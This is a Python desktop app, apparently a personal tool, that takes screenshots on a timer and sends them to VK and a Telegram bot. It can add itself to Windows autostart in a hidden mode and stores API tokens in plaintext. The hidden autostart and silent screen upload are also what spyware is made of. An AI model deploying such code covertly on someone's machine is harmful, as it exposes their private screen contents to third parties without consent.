import time
import pyautogui
import vk_api
import requests
import io
import tkinter as tk
import json
import os
import sys
import winreg

class ScreenshotSender:
    def __init__(self):
        self.window = tk.Tk()

        # проверяем, был-ли передан аргумент для открытия в скрытом режиме
        if "-h" in sys.argv:
            self.window.withdraw() # запуск в скрытом режиме

        #пытаюсь установить иконку
        try:
            try:
                base_path = sys._MEIPASS
            except Exception:
                base_path = os.path.abspath(".")
            self.window.wm_iconbitmap(os.path.join(base_path, "icon.ico"))
        except:
            print("Не удалось установить иконку приложения")
            
        self.window.title("Turbo-Screenshoter")
        self.window.geometry("400x350")

        self.vk_token_label = tk.Label(self.window, text="Токен VK:")
        self.vk_token_entry = tk.Entry(self.window)
        self.tg_token_label = tk.Label(self.window, text="Токен Telegram:")
        self.tg_token_entry = tk.Entry(self.window)
        self.chat_id_label = tk.Label(self.window, text="ID чата Telegram:")
        self.chat_id_entry = tk.Entry(self.window)
        self.interval_label = tk.Label(self.window, text="Интервал (секунды):")
        self.interval_scale = tk.Scale(self.window, from_=10, to=7200, orient=tk.HORIZONTAL)
        self.interval_scale.set(60)
        self.start_button = tk.Button(self.window, text="СТАРТ", bg='lightgreen', command=self.start_screenshot_sender)
        self.add_startup_button = tk.Button(self.window, text="Добавить в автозагрузку", command=self.add_to_startup)

    def take_screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot_bytes = io.BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        return screenshot_bytes

    def send_vk(self, vk_token, screenshot_bytes):
        try:
            vk_session = vk_api.VkApi(token=vk_token)
            screenshot_bytes.seek(0)
            vk = vk_session.get_api()
            user_info = vk.users.get()[0]
            user_id = user_info['id']
            upload = vk_api.VkUpload(vk_session)
            photo = upload.photo_messages(screenshot_bytes)[0]
            vk.messages.send(
                user_id=user_id,
                random_id=vk_api.utils.get_random_id(),
                attachment=f'photo{photo["owner_id"]}_{photo["id"]}'
            )
            print("Фотография успешно отправлена!")
        except Exception as error:
            print(error)

    def send_tg(self, tg_token, chat_id, screenshot_bytes):
        try:
            screenshot_bytes.seek(0)
            url = f"https://api.telegram.org/bot{tg_token}/sendPhoto"
            files = {'photo': screenshot_bytes}
            data = {'chat_id': chat_id}
            response = requests.post(url, files=files, data=data)
            print(response.json())
            if response.status_code == 200:
                print("Скриншот успешно отправлен в Telegram!")
            else:
                print("Не удалось отправить скриншот в Telegram.")
        except Exception as error:
            print(error)

    def main_cycle(self, vk_token, tg_token, chat_id, interval):
        while True:
            screenshot_bytes = self.take_screenshot()
            if self.vk_token_entry.get() != "":
                self.send_vk(vk_token=vk_token, screenshot_bytes=screenshot_bytes)
            if self.tg_token_entry.get() != "" and self.chat_id_entry.get() != "":
                self.send_tg(tg_token=tg_token, chat_id=chat_id, screenshot_bytes=screenshot_bytes)

            time.sleep(interval)

    def start_screenshot_sender(self):
        vk_token = self.vk_token_entry.get()
        tg_token = self.tg_token_entry.get()
        chat_id = self.chat_id_entry.get()
        interval = self.interval_scale.get()
        if vk_token == "" or (tg_token == "" and chat_id == ""):
            return

        self.window.withdraw()
        # Save data to JSON file
        settings = {
            'vk_token': vk_token,
            'tg_token': tg_token,
            'chat_id': chat_id,
            'interval': interval
        }
        with open('settings.json', 'w') as file:
            json.dump(settings, file)

        self.main_cycle(vk_token=vk_token, tg_token=tg_token, chat_id=chat_id, interval=interval)

    def load_settings(self):
        try:
            with open('settings.json', 'r') as file:
                settings = json.load(file)
                self.vk_token_entry.insert(0, settings['vk_token'])
                self.tg_token_entry.insert(0, settings['tg_token'])
                self.chat_id_entry.insert(0, settings['chat_id'])
                self.interval_scale.set(settings['interval'])
        except FileNotFoundError:
            pass

    def add_to_startup(self):
        # добавление в автостарт
        # получаем путь к exe-файлу
        exe_path = sys.executable
        # добавление в автозагрузку
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        # Устанавливаем путь к скрипту в автозагрузку
        script_path = fr"{os.path.normpath(exe_path)}"
        winreg.SetValueEx(key, "screener", 0, winreg.REG_SZ, f"{script_path} -h")
        # Закрываем ключ реестра
        winreg.CloseKey(key)

    def run(self):
        self.load_settings()
        self.add_startup_button.pack(fill="both", padx=5, pady=5, side="top")
        self.vk_token_label.pack()
        self.vk_token_entry.pack(fill="both", padx=5)
        self.tg_token_label.pack()
        self.tg_token_entry.pack(fill="both", padx=5)
        self.chat_id_label.pack()
        self.chat_id_entry.pack(fill="both", padx=5)
        self.interval_label.pack()
        self.interval_scale.pack(fill="both")
        self.start_button.pack(fill="both", padx=5, pady=5, side="bottom")
        
        self.window.mainloop()

if __name__ == "__main__":
    print(sys.argv)
    sender = ScreenshotSender()
    sender.run()



